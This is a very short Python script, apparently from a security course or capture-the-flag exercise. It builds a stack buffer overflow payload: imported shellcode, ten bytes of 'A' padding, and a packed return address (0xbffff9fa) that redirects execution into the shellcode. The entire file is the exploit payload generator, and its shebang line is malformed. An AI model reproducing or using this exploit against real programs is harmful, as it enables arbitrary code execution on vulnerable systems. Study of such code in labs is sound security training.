#!/user/bin/bash/python

from struct import pack
from shellcode import shellcode

addr = pack("<I", 0xbffff9fa)
print(shellcode + "A"*10 + addr)
